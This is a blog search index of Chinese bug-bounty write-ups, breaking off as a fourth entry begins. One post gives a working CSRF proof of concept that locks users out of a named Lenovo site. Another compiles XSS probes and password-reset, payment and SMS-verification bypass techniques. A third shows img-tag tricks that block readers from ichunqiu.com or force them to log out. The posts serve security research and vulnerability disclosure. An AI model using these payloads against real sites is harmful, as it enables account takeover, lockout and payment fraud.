<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>联想某处组合csrf</title>
      <link href="/2018/12/24/lian-xiang-mou-chu-zu-he-csrf/"/>
      <url>/2018/12/24/lian-xiang-mou-chu-zu-he-csrf/</url>
      
        <content type="html"><![CDATA[<p>1、打开Url：<code>http://www.enjoy3c.com/getMyInfo.do</code></p><p><img src="http://static.zybuluo.com/1kbfree/rekurvzdaq2vrs8riqg6p478/image_1cidsgkuu118n1see19cevvo1ugr9.png" alt="image_1cidsgkuu118n1see19cevvo1ugr9.png-80.5kB"></p><p>2、点击确定并且抓包，抓取的数据包如下</p><pre><code>POST /editMyInfo.do HTTP/1.1Host: www.enjoy3c.comContent-Length: 124Cache-Control: max-age=0Origin: http://www.enjoy3c.comUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://www.enjoy3c.com/getMyInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: account=lalala&amp;loginMobile=13688888888&amp;loginEmail=1900065568%40qq.com&amp;realName=11&amp;identityCard=&amp;birthday=&amp;province=3&amp;city=36</code></pre><p>因为此处存在逻辑问题，可绕过验证绑定任意手机号码任意邮箱，并且在登陆的时候需要输入如下数据：</p><p><img src="http://static.zybuluo.com/1kbfree/6qb7lf2vv4s47ndyf5fvs4g0/image_1cidskcobm6lrbpe3esb214t1m.png" alt="image_1cidskcobm6lrbpe3esb214t1m.png-289.6kB"></p><p>所以我们只需要将<code>邮箱、手机号码、用户名</code>修改为用户不可能知道的数据，那么点击这个<code>csrf poc</code>的用户就没办法再次登陆此网站了。</p><p>so，将如上数据包中的<code>account</code>修改为<code>only_free_2018</code>，将<code>loginMobile</code>修改为<code>110</code>，将<code>loginEmail</code>修改为<a href="mailto:`admin@lenovo.com" target="_blank" rel="noopener">`admin@lenovo.com</a>`，修改后的数据包如下：</p><pre><code>POST /editMyInfo.do HTTP/1.1Host: www.enjoy3c.comContent-Length: 124Cache-Control: max-age=0Origin: http://www.enjoy3c.comUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://www.enjoy3c.com/getMyInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: closeaccount=only_free_2018&amp;loginMobile=110&amp;loginEmail=admin@lenovo.com&amp;realName=11&amp;identityCard=&amp;birthday=&amp;province=3&amp;city=36</code></pre><p>3、将其构造为<code>csrf poc</code></p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://www.enjoy3c.com/editMyInfo.do&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;only&amp;#95;free&amp;#95;2018&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;loginMobile&quot; value=&quot;110&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;loginEmail&quot; value=&quot;admin&amp;#64;lenovo&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;realName&quot; value=&quot;11&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;identityCard&quot; value=&quot;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;birthday&quot; value=&quot;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;province&quot; value=&quot;3&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;city&quot; value=&quot;36&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>4、在浏览器处打开此poc：</p><p><img src="http://static.zybuluo.com/1kbfree/d0avtrk11i2ce9fsztk5c0lg/image_1cidstmth174t1e1qtjg1dmehs71j.png" alt="image_1cidstmth174t1e1qtjg1dmehs71j.png-24.4kB"></p><p><img src="http://static.zybuluo.com/1kbfree/z7lm3p2pi03regpyfb1y7k3m/image_1cidstumjjc7ts7mql1oul10ok20.png" alt="image_1cidstumjjc7ts7mql1oul10ok20.png-23.8kB"></p><p><img src="http://static.zybuluo.com/1kbfree/cm1s0m28atunru992vil55i6/image_1cidsuenigbfvml5fkidtopv2d.png" alt="image_1cidsuenigbfvml5fkidtopv2d.png-99.3kB"></p><p>成功被修改，那么这个时候，就没办法再登陆此网站了，因为登陆凭据被我修改了，比修改密码还要狠，修改密码后还可以用手机号码或者邮箱找回，而这个连密码都没办法找回，并且还不知道手机号码和邮箱和用户名是多少~~</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘思路小总结【持续更新】</title>
      <link href="/2018/12/24/lou-dong-wa-jue-si-lu-xiao-zong-jie/"/>
      <url>/2018/12/24/lou-dong-wa-jue-si-lu-xiao-zong-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>1、首先，比如在调用图片处，调用远程文件（修改为要访问的URL）处，或者一些IP查询的，如图</p><p><img src="http://static.zybuluo.com/1kbfree/pah66v9b293kuy2gz5xu77g4/image_1chnh3u3kvsmc6710kr1l3i1nqn19.png" alt="image_1chnh3u3kvsmc6710kr1l3i1nqn19.png-102.3kB"></p><p>上图就是百度某站点去请求输入框里面的内容，也就是<code>bbs.ixsec.org/baidu.php</code>，然后服务端就会去请求这个URL，并且将数据返回到输出的地方。</p><p>2、比如当存在ssrf处没有过滤的话，是可以探测内网的，比如<code>127.0.0.1</code>等。</p><p>3、还能探测IP地址等。</p><h4 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h4><p>1、白名单方法：设置只允许请求xxx网址。</p><h3 id="Csrf"><a href="#Csrf" class="headerlink" title="Csrf"></a>Csrf</h3><p>Csrf多处存在于 修改 增加 删除 等操作中都可以尝试使用跨站请求伪造。</p><h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p>1、搜索框里输入<code>&lt;img src=x onerror=alert(1)&gt;</code>，查看是否能弹窗。</p><p>2、比如某个页面评论处插入了<code>&lt;img src=x&gt;</code>被实体编码的话，假设当前的网站有一个引用功能，那么我们就可以引用一下这个评论，如果在引用页面没有实体化编码的话，那么就会存在二次Xss漏洞攻击。</p><p>3、比如某些网站在评论后会显示 IP 或者 来源（电脑、手机、苹果之类的），如果是可控的话我们可以修改为恶意的<code>JS</code>代码，因为很少开发者会把这些地方选择实体化编码。</p><p>4、总结就是有框就插，没实体输出的话就干，没实体输出的话就选择去绕过~</p><h3 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h3><p>我也不太会，不写了</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>1、普遍创建<code>2</code>个账号，然后将 2 个账号中统一操作的数据包复制下来，慢慢的进行分析，查看是否有身份标识是可控的。</p><p>2、某些网站的ID是非常的长的，但是如果是有规则的话还是可以分析出来的，如下案例：</p><p>iamfree账号的ID：</p><pre><code>2018666iamfreeabcbcaabcbca66612</code></pre><p>hack账户的ID：</p><pre><code>2018666hackabcbcaabcbca66676</code></pre><p>提取下来分析，这个案例很简单，有眼睛都看得出来只有中间的和最后面的不同，而中间不同处是用户的名称，而后面二位不同的话是可以爆破的，毕竟才二位。</p><h3 id="任意用户操作（如注册，重置等）"><a href="#任意用户操作（如注册，重置等）" class="headerlink" title="任意用户操作（如注册，重置等）"></a>任意用户操作（如注册，重置等）</h3><blockquote><p>此漏洞一般都是处于<strong>忘记密码处和注册处</strong></p></blockquote><h4 id="手机号码找回"><a href="#手机号码找回" class="headerlink" title="手机号码找回"></a>手机号码找回</h4><ol><li><p>输入520xxx后网站会对520xxx发送一条验证码，此时可以查看一下数据包中或者返回的数据包中是否存在此验证码，</p></li><li><p>输入正确的手机号码和验证码，然后抓包查看返回值，然后替换到想任意重置的用户的数据返回包中，查看是否能够成功的绕过从而重置密码</p></li><li><p>如果验证码是4位的，且有效时间过长是可以选择爆破的。</p></li><li><p>自己加入一下数据，假设<a href="http://www.a.com在修改用户数据的时候会传递一个值（user_name），然后我们在忘记密码处输入正确的手机号码和验证码，并且再重置成功的最后一步参数添加user_name=admin，如果这里是有接受user_name的值的话并且处理的话，你就可以重置admin用户的账号密码了。" target="_blank" rel="noopener">www.a.com在修改用户数据的时候会传递一个值（user_name），然后我们在忘记密码处输入正确的手机号码和验证码，并且再重置成功的最后一步参数添加user_name=admin，如果这里是有接受user_name的值的话并且处理的话，你就可以重置admin用户的账号密码了。</a></p></li><li><p>查看每一步操作，比如<strong>第一步</strong>是验证手机号码是否正确，<strong>第二步</strong>是填写新密码，那么我们在<strong>第一步</strong>输入正确的手机号码（<code>1511...</code>）-&gt;点击获取验证码-&gt;输入正确的验证码，然后到达<strong>第二步</strong>的时候填写新的密码然后抓包（放到<code>Repeater</code>模块里）。然后我们再回到第一步，输入<code>17520...</code>的手机号码-&gt;点击获取验证码（不用输入验证码，因为你也获取不到其他用户的验证码），然后我们在<code>Repeater</code>模块中点击<code>1511...</code>用户输入新密码的那个数据包的<code>GO</code>，如果可以重置就表示没有判断第一步就可以执行第二步了，但是这里有一点是注意的，如果手机号码和验证码存在第二步中，那么这个方法就不会有效。</p></li><li><p>见过最多的是找回密码的token是base64编码的，而解码后的明文根据其规则修改就可以成为别人用户找回密码的凭证了。</p></li></ol><h4 id="邮箱账号找回"><a href="#邮箱账号找回" class="headerlink" title="邮箱账号找回"></a>邮箱账号找回</h4><ol><li><p>HOST头伪造：输入正确的邮箱账号，但是修改 HOST（也就是发送的域名） ，比如修改为<code>www.iamfree.com</code>（如果这里没有过滤的话，邮箱里发送的内容就会是<a href="http://www.iamfree.com/xxx重置密码链接xxx），然后`www.iamfree.com`的功能就是存储每个请求，那么我们就可以获取到重置密码的请求，从而来重置用户的账号" target="_blank" rel="noopener">www.iamfree.com/xxx重置密码链接xxx），然后`www.iamfree.com`的功能就是存储每个请求，那么我们就可以获取到重置密码的请求，从而来重置用户的账号</a></p></li><li><p>设计不当，如图:<br> <img src="http://static.zybuluo.com/1kbfree/2c6l0py7anivgdidm1c25owk/QQ%E5%9B%BE%E7%89%8720180711111343.png" alt="QQ图片20180711111343.png-133.5kB"></p><p> <em>同时这里还可邮箱轰炸，不断的点击修改密码，那么网站就会一直发送邮箱给修改的用户</em></p></li><li><p>其余同手机号码找回漏洞原理差不多。</p></li></ol><h4 id="重置他人密码"><a href="#重置他人密码" class="headerlink" title="重置他人密码"></a>重置他人密码</h4><p><img src="http://static.zybuluo.com/1kbfree/buwt3bresnlpdvu152xsuv3k/image_1ci3lgscf15gd123rs1118171o09dh.png" alt="image_1ci3lgscf15gd123rs1118171o09dh.png-69.7kB"></p><h4 id="注册用户处"><a href="#注册用户处" class="headerlink" title="注册用户处"></a>注册用户处</h4><ol><li>这里的话也和手机找回密码处逻辑差不多，但是不同的是任意用户注册的话手机号码是存在的，而任意用户注册的话是手机号码不存在，并且可以不用输入正确的手机号码验证码就可绕过。</li></ol><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>没挖过</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>没挖过</p><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><h4 id="图形类验证码绕过"><a href="#图形类验证码绕过" class="headerlink" title="图形类验证码绕过"></a>图形类验证码绕过</h4><ol><li><p>验证码刷新之后，而历史刷新的验证码还是可以继续使用。</p></li><li><p>验证码使用过后不刷新，时效性不过期，可以一直复用。</p></li><li><p>很多验证码的显示很简单，容易被机器识别。</p></li></ol><h4 id="短信类验证码绕过"><a href="#短信类验证码绕过" class="headerlink" title="短信类验证码绕过"></a>短信类验证码绕过</h4><ol><li><p><strong>验证码过于简易&amp;接口未限制</strong>：有些手机短信验证码都为 4-8位 纯数字的验证码，在接口没有任何限制的情况下是可以直接爆破的</p></li><li><p><strong>验证码发送复用&amp;时效性过长&amp;接口未限制</strong>：位数验证码时效性为5分钟，但是在这里同一手机号发送的验证码都是一样的，所以可以在4分钟的时候重新发送一次验证码这样验证码就又有效了，因为验证码一直在被复用，所以可以爆破。</p></li><li><p><strong>万能验证码</strong>：这是很多大企业的诟病，在未上线前为了方便测试加了<code>888888</code>、<code>000000</code>这样的万能验证码但是上线后没去删除测试的3内容导致被恶意利用。</p></li><li><p>验证码有回显，如图：<br> <img src="http://static.zybuluo.com/1kbfree/pkphqx4gbjtgff9wufh5zzh6/image_1ci3kbdbf47i19m661bkis14hd9.png" alt="image_1ci3kbdbf47i19m661bkis14hd9.png-181.1kB"></p></li><li><p>各种可逆<br> <img src="http://static.zybuluo.com/1kbfree/6b1e508ho3oxitluwmsarl2t/image_1ci3kh3ah1mk2v9vhpf14l71gan36.png" alt="image_1ci3kh3ah1mk2v9vhpf14l71gan36.png-143.9kB"></p><p> <img src="http://static.zybuluo.com/1kbfree/anl52kj3h3bweipc37v9bwe1/image_1ci3kkd4l190h141t6u7109g1s5i5j.png" alt="image_1ci3kkd4l190h141t6u7109g1s5i5j.png-105.5kB"></p></li><li><p>逻辑顺序</p></li></ol><h3 id="短信-语音验证码重放"><a href="#短信-语音验证码重放" class="headerlink" title="短信/语音验证码重放"></a>短信/语音验证码重放</h3><blockquote><p>无论是发送短信还是语音验证码来做验证，都是需要手机号的，而发送验证码实际上是需要成本的，需要跟运营商或者是第三方验证码平台进行合作，多数验证码为0.01元一条，当然也有更便宜的，所以这边的问题也会影响到一个企业的资产方面。</p></blockquote><ol><li><p>厂商对验证码发送这一块并没有进行限制时间发送，可造成短信轰炸</p></li><li><p>很多厂商会对手机号进行限制，如果60秒内发送过就不会发送，但是程序员在设计代码层的逻辑时会出现很多奇葩的问题，例如其为了方便用户体验，正常的代码层的流程为：去除用户手误输入的空格以及一些特殊符号 -&gt; 验证手机号是否发送过验证码。</p><p> 某些程序员会这样设计流程： 验证手机号是否发送过验证码（发送过则不放行 没发送过则进入下一步） -&gt; 去除用户手误输入的空格以及一些特殊符号 -&gt; 发送手机号验证码</p><p> <img src="http://static.zybuluo.com/1kbfree/9681mrzwscihzf00jd1w9cas/image_1ci3l05h35stck719k01nqj6v59q.png" alt="image_1ci3l05h35stck719k01nqj6v59q.png-192.5kB"></p></li><li><p><strong>手机号可遍历发送</strong>：验证码发送会影响到企业资产，那么发送验证码限制就不能仅仅针对于单一手机号的限制，例如我可以载入一堆手机号的字典，然后直接遍历发送验证码，这也是危害之一。</p></li></ol><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><ol><li><p>查看是否是<code>IIS6.0</code>等搭建的，因为如果是这些服务器搭建的话我们是可以通过解析漏洞或者00截断来上传我们想要上传的文件</p></li><li><p>如果只是前端判断上传的文件后缀名的话，我们可以用<code>Burp</code>来绕过</p></li><li><p>如果是只判断了HTTP/HTTPS的请求包中的<code>Content-type</code>我们就只需要修改为合法的就可以上传了。</p></li><li><p>更多（待续）</p></li></ol><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>比如一个后台，是需要正确的管理员密码才能登陆（废话），那么未授权访问就是说不需要用户名和密码即可登陆后台。</p><ol><li>比如你输入账号密码后服务端会判断账号密码是否正确，如果登陆成功，照常访问，如果登陆失败的话就会用前段的跳转强制让你回到首页，那么我们可以抓包的时候修改返回值，如果返回值是html代码的话，找到跳转的链接，将其删除，如果是状态码这些，将类似的<code>Error</code>修改为<code>Success</code>，总之看情况的。</li></ol><h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><blockquote><p>基本上大站是不存在这个漏洞的，除非个把程序员想要去祭天</p></blockquote><ol><li><p>比如购买iamfree这个产品的时候，需要99999999999元，那么我们在点击购买的时候，尝试修改99999999999元为1元后放包，查看是否能购买成功</p></li><li><p>比如在购买iamfree的时候，都会弹出一个是否购买成功然后选项是购买成功，另一个选项是购买失败，那么我们什么都不要点击，因为这样子的肯定是有空多长时间重新请求的，我们就可以打开代理，并且开启抓包模式，等又发起请求的时候，我们可以修改请求包中的返回值为正确购买的（多修改试试）</p></li><li><p>如果商品的价格是不能改的话我们可以试试这个思路：一般购买商品的话是存在优惠券的，比如我购买iamfree的时候需要200元，而优惠券就是满200优惠10元的，那么可以-&gt;选择这个优惠卷-&gt;抓包，查看数据包里是否有可以的参数的值为10为199，那么这个时候如果没有验证优惠券的价格的话就会变成1元钱（200-199=1，我只是为了声明，并没有怀疑你们的智商= ~~ =）就可以购买了。</p></li><li><p>如果以上都不成功的话还是别放弃，查看一下网站是否存在退款功能，比如我购买了10元的产品，那么还没发货的时候我们可以点击退款，但是退款中，数据包中包含那个10，那么我们可以尝试一下把10修改为1000，然后查看一下自己的钱是否有变多~</p></li><li><p>还是退款功能，我们抓取数据包后，放到<code>Repeater</code>模块中，一直点GO，虽然我也不知道原理，但是记得有看文章看到过，反正如果添加了你的余额就可以了。</p></li><li><p>修改商品数量</p></li><li><p><strong>sign值可逆：</strong> sign多数为对比确认金额的一段内容，很多都是md5加密的，这时候你要做好自己的分析明文到底是什么，然后去碰撞，例如可能是md5(订单号+金额)这样的的组合，然后修改金额重新生成sign就可以绕过金额固定的限制了。</p></li></ol><h3 id="通用操作绕过"><a href="#通用操作绕过" class="headerlink" title="通用操作绕过"></a>通用操作绕过</h3><ol><li><p>假设某个步骤1的<code>URL</code>为<code>http://www.iamfree.com/do1</code>，这时候可以尝试修改下链接为<code>/do2</code>等类似的<code>URL</code>的来测试是否能绕过第一步来进行第二步的操作。</p><p> <img src="http://static.zybuluo.com/1kbfree/edxojnlxcdjd9c4jsvimkr14/image_1ci3l1b511s8p1ffcpdsko81ubca7.png" alt="image_1ci3l1b511s8p1ffcpdsko81ubca7.png-104.2kB"></p></li></ol><h3 id="条件竞争-HTTP并发"><a href="#条件竞争-HTTP并发" class="headerlink" title="条件竞争(HTTP并发)"></a>条件竞争(HTTP并发)</h3><ol><li>在签到、转账、兑换、购买等场景是最容易出现这样的问题。比如当你点击签到的时候，抓包，然后放到<code>Repeater</code>模块里，一直点击<code>GO</code>，如果程序员没有做严格的过滤的话，我们点击的<code>签到、转账、兑换、购买</code>的次数会随着<code>GO</code>的次数增加，而且不会消耗另外的东西。</li></ol><h3 id="任意URL跳转漏洞"><a href="#任意URL跳转漏洞" class="headerlink" title="任意URL跳转漏洞"></a>任意URL跳转漏洞</h3><p>这里以途牛为例（马赛克走起）</p><p><img src="http://static.zybuluo.com/1kbfree/82etcgp78wa9cxddl2507sck/image_1ci1jsh76han1cbvm0jenvaud19.png" alt="image_1ci1jsh76han1cbvm0jenvaud19.png-86.2kB"></p><p>他这里的<code>murl</code>就是跳转到哪儿的链接，但是被限制了（目测是正则，但是正则这东西很容易绕过的，不相信继续看下去）</p><p><img src="http://static.zybuluo.com/1kbfree/m3qaf7ts388spf33tebasl4u/image_1ci1k65ij1qvf7br13e3gv6duk26.png" alt="image_1ci1k65ij1qvf7br13e3gv6duk26.png-129.1kB"></p><p>我们输入一下<code>https://www.我们的url.com/?www.途牛url.com</code></p><p><img src="http://static.zybuluo.com/1kbfree/53dzezrpirj31mfuvmq5091s/image_1ci1k923m12evj45p8j1ut4mlk2j.png" alt="image_1ci1k923m12evj45p8j1ut4mlk2j.png-103.3kB"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个有趣的思路</title>
      <link href="/2018/12/24/yi-ge-you-qu-de-si-lu/"/>
      <url>/2018/12/24/yi-ge-you-qu-de-si-lu/</url>
      
        <content type="html"><![CDATA[<p>首先，正常打开I春秋页面（<code>https://bbs.ichunqiu.com/portal.php</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/nwi21qubl7d9nfk5bsgcmo9n/image_1co8pc6j2lsosoc5deimp119l9.png" alt="image_1co8pc6j2lsosoc5deimp119l9.png-488kB"></p><p>然后手贱一下加上一个<code>alert(1)</code>试试~（<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/6btvax83xx7vsc6lwf4wpbnc/image_1co8pe8r41j8u13va2nqeo4tlsm.png" alt="image_1co8pe8r41j8u13va2nqeo4tlsm.png-80kB"></p><h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>我去=v=。这个<code>WAF</code>（加速乐）很强，这都给拦了，但是作为一个捡漏洞的人来讲，要别人交互的漏洞都是低位和不收的，而且这个是要用户打开链接才可以被拦截，但是等下就会正常显示，那用户点击后发现会显示这个页面不可能再次点击把~，那么就应该想想如何提升危害，然后我发现了有个好玩的~</p><h3 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h3><p>首先我在本地尝试一下，创建一个<code>HTML</code>文件，代码是</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>拦截吧（你打不开i春秋了）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://bbs.ichunqiu.com/portal.php?a<span class="token punctuation">=</span>alert(1)<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>然后在浏览器处打开</p><p><img src="http://static.zybuluo.com/1kbfree/o1esq9tp010wd1h1lcfg5djd/image_1co8pnjs3hpu61e2qu178avuq13.png" alt="image_1co8pnjs3hpu61e2qu178avuq13.png-13.8kB"></p><p>然后再尝试打开<code>I春秋</code></p><p><img src="http://static.zybuluo.com/1kbfree/jm5cdg98scgmuh8bruh46a1k/image_1co8ppa5ldmeg3r1b2ria5128h1g.png" alt="image_1co8ppa5ldmeg3r1b2ria5128h1g.png-74.1kB"></p><p>我来解释一下为啥子~因为<code>img</code>标签设置的<code>src</code>属性是<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>，所以打开页面会加载<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>这个<code>URL</code>，然后我们访问这个<code>URL</code>的话会被<code>WAF</code>拦截，导致无法访问<code>I春秋</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>我们可以看到<code>I春秋</code>回复处可以加载图片，如下（随便打开一个文章：<code>https://bbs.ichunqiu.com/thread-46084-1-1.html</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/eje7n4yxnwov6cp5zmiuqoif/image_1co8rbua7oeq4qj6kmte5vvm6r.png" alt="image_1co8rbua7oeq4qj6kmte5vvm6r.png-111.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/nk77x8b6bu3olh7vd7o2ecx1/image_1co8rd4ln1s3uj5ubud1st01gij78.png" alt="image_1co8rd4ln1s3uj5ubud1st01gij78.png-149.4kB"></p><p>上传的图片是：<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle</code></p><p>那么我想让别人访问这个文章就显示<code>WAF</code>拦截页面如何搞？ 嘿嘿，可以在链接后面加个<code>&amp;a=alert(1)</code>，变成<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)</code></p><blockquote><p>注意：先发一条评论然后点击编辑然后插入这段代码</p></blockquote><pre><code>[img=120,120]https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)[/img]</code></pre><p>如下</p><p><img src="http://static.zybuluo.com/1kbfree/6sq9x8f4w6ntntvxjxqztqvz/image_1co8rja781h0o9q282f11lva7l82.png" alt="image_1co8rja781h0o9q282f11lva7l82.png-103.1kB"></p><p>然后再次访问 <code>https://bbs.ichunqiu.com/thread-46084-1-1.html</code></p><p><img src="http://static.zybuluo.com/1kbfree/v8ky2tc30m99log7jrih4khx/image_1co8rlknh1bi6i131rafr51nbf8f.png" alt="image_1co8rlknh1bi6i131rafr51nbf8f.png-100.1kB"></p><p>可以看到加载了，那么刷新一下~</p><p><img src="http://static.zybuluo.com/1kbfree/uz3q9onxmdllqfac4gpwwmam/image_1co8rm7751lfi16hb10e31151rae8s.png" alt="image_1co8rm7751lfi16hb10e31151rae8s.png-81.3kB"></p><p>那么，我如果想恶意破坏的话，我可以在每个文章那里加上这个代码（评论），导致每个看文章的人无法正常访问I春秋~~</p><h3 id="漏洞案例复现"><a href="#漏洞案例复现" class="headerlink" title="漏洞案例复现"></a>漏洞案例复现</h3><p>利用条件：</p><p>1、退出的Url没有Token等验证<br>2、可以有<code>&lt;img&gt;</code>或者其他加载资源的标签</p><p>首先，知道某网站的退出链接是<code>http://www.xxx.com/exit</code>。</p><p>那么我们可以去找到论坛留言处、头像处、背景图片处将Url设置为<code>http://www.xxx.com/exit</code>，那么当用户每次访问的时候都会退出。如下是一个漏洞案例</p><p>1、打开Url：<a href="http://xxxxxx/forum.php?id=马赛克" target="_blank" rel="noopener">http://xxxxxx/forum.php?id=马赛克</a> （随便找的一个帖子），然后评论一下，并且抓包加入恶意代码，如下</p><p><img src="http://static.zybuluo.com/1kbfree/mzs2zy1p11g46343mj011xre/image_1cqbpd8e23mnkej99cnep1cro9.png" alt=""></p><p>加入的代码是 <code>[img]http://xxxxxx/logout?client_id=1[/img]</code></p><p>2、然后打开帖子</p><p><img src="http://static.zybuluo.com/1kbfree/ls8y940ot3y8lanz0b9v7u7m/image_1cqbpfvh81qrm1lne1tbo1iou16qm.png" alt=""></p><p><img src="http://static.zybuluo.com/1kbfree/vogapad0mu7bdhkmk0zpywab/image_1cqbpif0ptjk1p5d1tqp8slj0j13.png" alt=""></p><p>可以看到已经退出了~</p><p>利用思路</p><p>上面是一个利用思路，但是这个只是评论处的利用，其实还有很多可以，如下几列</p><p>1、可以利用Csrf漏洞结合，把头像、个人背景等img的地址修改为退出url<br>2、利用越权改头像把图片地址改成退出地址，然后其他用户一登录就退出，增加危害~<br>3、有些网站聊天处可以发图片，那么可以发送一个退出Url给他，导致退出（单次的，低危害） </p><h3 id="思路扩展"><a href="#思路扩展" class="headerlink" title="思路扩展"></a>思路扩展</h3><p>1、有个<code>get</code>请求的<code>csrf</code>，但是严格的验证了<code>referer</code>为<code>www.a.com</code>，那么可以在<code>www.a.com</code>中插入一个外链，然后把外链地址改为<code>get</code>请求的<code>csrf</code>地址，就可以绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美团某处上传存在SSRF漏洞</title>
      <link href="/2018/12/24/mei-tuan-mou-chu-shang-chuan-cun-zai-ssrf-lou-dong/"/>
      <url>/2018/12/24/mei-tuan-mou-chu-shang-chuan-cun-zai-ssrf-lou-dong/</url>
      
